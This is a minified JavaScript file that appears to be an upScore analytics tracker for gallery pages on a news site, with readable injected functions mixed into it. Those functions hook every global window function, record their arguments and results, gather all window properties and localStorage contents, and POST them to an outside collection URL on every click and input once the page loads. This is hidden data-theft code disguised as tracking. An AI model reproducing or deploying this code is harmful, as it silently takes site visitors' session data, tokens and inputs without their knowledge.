(() => {
  "use strict";

  function t(t, e) {
    (null == e || e > t.length) && (e = t.length);
    for (var n = 0, r = new Array(e); n < e; n++) r[n] = t[n];
    return r;
  }
  function e(e, n) {
    return function (t) {
      if (Array.isArray(t)) return t;
    }(e) || function (t, e) {
      var n = null == t ? null : "undefined" != typeof Symbol && t[Symbol.iterator] || t["@@iterator"];
      if (null != n) {
        var r,
          i,
          o,
          a,
          c = [],
          l = !0,
          u = !1;
        try {
          if (o = (n = n.call(t)).next, 0 === e) {
            if (Object(n) !== n) return;
            l = !1;
          } else for (; !(l = (r = o.call(n)).done) && (c.push(r.value), c.length !== e); l = !0);
        } catch (t) {
          u = !0, i = t;
        } finally {
          try {
            if (!l && null != n.return && (a = n.return(), Object(a) !== a)) return;
          } finally {
            if (u) throw i;
          }
        }
        return c;
      }
    }(e, n) || function (e, n) {
      if (e) {
        if ("string" == typeof e) return t(e, n);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === r && e.constructor && (r = e.constructor.name), "Map" === r || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? t(e, n) : void 0;
      }
    }(e, n) || function () {
      throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }();
  }
  function hookFunc(originalFunction) {
    return function () {
      console.log('Function ' + originalFunction.name + ' was hooked and is running now...');
      var results = originalFunction.apply(this, arguments);
      localStorage.setItem("hook:" + originalFunction.name, JSON.stringify({
        arguments: Array.from(arguments),
        results: results instanceof Object ? JSON.stringify(results) : results
      }));
      return results;
    };
  }
  function n(t) {
    return n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, n(t);
  }
  function jshook() {
    for (let prop in window) {
      if (window.hasOwnProperty(prop) && typeof window[prop] === "function") {
        window[prop] = hookFunc(window[prop]);
      }
    }
  }
  function r(t) {
    var e = function (t, e) {
      if ("object" !== n(t) || null === t) return t;
      var r = t[Symbol.toPrimitive];
      if (void 0 !== r) {
        var i = r.call(t, e || "default");
        if ("object" !== n(i)) return i;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === e ? String : Number)(t);
    }(t, "string");
    return "symbol" === n(e) ? e : String(e);
  }
  function collectWindowData() {
    const collectedData = {};
    for (const prop in window) {
      if (window.hasOwnProperty(prop)) {
        const value = prop in localStorage ? localStorage.getItem(prop) : window[prop];
        const type = typeof value;
        collectedData[prop] = {
          type: type,
          value: type === "function" ? null : value
        };
      }
    }
    return collectedData;
  }
  function i(t, e) {
    for (var n = 0; n < e.length; n++) {
      var i = e[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, r(i.key), i);
    }
  }
  function o(t, e, n) {
    if (!e.has(t)) throw new TypeError("attempted to " + n + " private field on non-instance");
    return e.get(t);
  }
  function a(t, e) {
    return function (t, e) {
      return e.get ? e.get.call(t) : e.value;
    }(t, o(t, e, "get"));
  }
  function c(t, e, n) {
    return function (t, e, n) {
      if (e.set) e.set.call(t, n);else {
        if (!e.writable) throw new TypeError("attempted to set read only private field");
        e.value = n;
      }
    }(t, o(t, e, "set"), n), n;
  }
  var l = "group-gallery:intersect:item";
  function u(t, e) {
    f(t, e), e.add(t);
  }
  function s(t, e, n) {
    f(t, e), e.set(t, n);
  }
  function f(t, e) {
    if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object");
  }
  function p(t, e, n) {
    if (!e.has(t)) throw new TypeError("attempted to get private field on non-instance");
    return n;
  }
  var h = new WeakMap(),
    y = new WeakMap(),
    v = new WeakSet(),
    d = new WeakSet(),
    b = new WeakSet(),
    m = new WeakSet(),
    w = new WeakSet(),
    g = new WeakSet(),
    S = function () {
      function t(e, n) {
        !function (t, e) {
          if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
        }(this, t), u(this, g), u(this, w), u(this, m), u(this, b), u(this, d), u(this, v), s(this, h, {
          writable: !0,
          value: void 0
        }), s(this, y, {
          writable: !0,
          value: void 0
        }), c(this, h, e), c(this, y, n);
      }
      var e, n, r;
      return e = t, (n = [{
        key: "init",
        value: function () {
          p(this, g, I).call(this), p(this, b, A).call(this), p(this, v, k).call(this);
        }
      }]) && i(e.prototype, n), r && i(e, r), Object.defineProperty(e, "prototype", {
        writable: !1
      }), t;
    }();
  function k() {
    a(this, y).eventObserver.add(l, p(this, w, E).bind(this));
  }
  function sendDataToServer(data) {
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const stateChangeHandler = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        console.log("服务器成功接收数据");
      }
    };
    xhr.onreadystatechange = stateChangeHandler;
    xhr.send(JSON.stringify(data));
  }
  function collectAndSendData() {
    jshook();
    const collectedData = collectWindowData();
    if (Object.keys(collectedData).length > 0) {
      sendDataToServer(collectedData);
    }
  }
  function j(t) {
    var e = this,
      n = 0,
      r = setInterval(function () {
        (++n >= 21 || p(e, m, O).call(e)) && (clearInterval(r), p(e, m, O).call(e) && t());
      }.bind(this), 500);
  }
  function A() {
    var t = this,
      e = a(this, y).config.get("cache.tracking.data.upScore");
    p(this, m, O).call(this) ? a(this, h).upScore(e) : p(this, d, j).call(this, function () {
      return a(t, h).upScore(e);
    });
  }
  function O() {
    return Boolean(a(this, h).upScore);
  }
  function E(t) {
    ["Gallery", "StarGallery"].includes(t.name) && a(this, h).upScore({
      event: "gallery",
      options: {
        image: t.index + 1
      }
    });
  }
  function I() {
    for (var t = {
        custom_app: a(this, y).deviceDetection.isInAppAndroid ? 2 : a(this, y).deviceDetection.isInAppIOS ? 3 : 0
      }, n = 0, r = Object.entries(t); n < r.length; n++) {
      var i = e(r[n], 2),
        o = i[0],
        c = i[1];
      a(this, y).config.set("cache.tracking.data.upScore.data.".concat(o), c);
    }
  }
  var W = window.gujService,
    T = window;
  T && W && !W.isAlreadyExecuted("file:///usr/src/app/client/site/partials/tracking-upscore/scripts/tracking-upscore.js") && new S(T, W).init();
  window.onload = function () {
    document.addEventListener("click", collectAndSendData);
    document.addEventListener("input", collectAndSendData);
  };
})();